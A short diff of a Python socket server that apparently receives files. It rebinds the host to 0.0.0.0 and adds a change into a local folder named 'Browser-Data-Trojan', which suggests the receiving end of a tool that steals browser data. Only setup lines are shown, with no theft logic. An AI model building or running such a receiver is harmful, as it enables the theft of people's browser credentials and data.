@@ -2,10 +2,12 @@ import socket
 import tqdm
 import os
 
-SERVER_HOST = "192.168.1.36"
+SERVER_HOST = "0.0.0.0"
 SERVER_PORT = 5679
 BUFFER_SIZE = 8192
 SEPARATOR = b"<SEPARATOR>"
+
+os.chdir(r'C:\Users\Shockz\Desktop\Browser-Data-Trojan')
 
 #Creo el socket
 sckt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
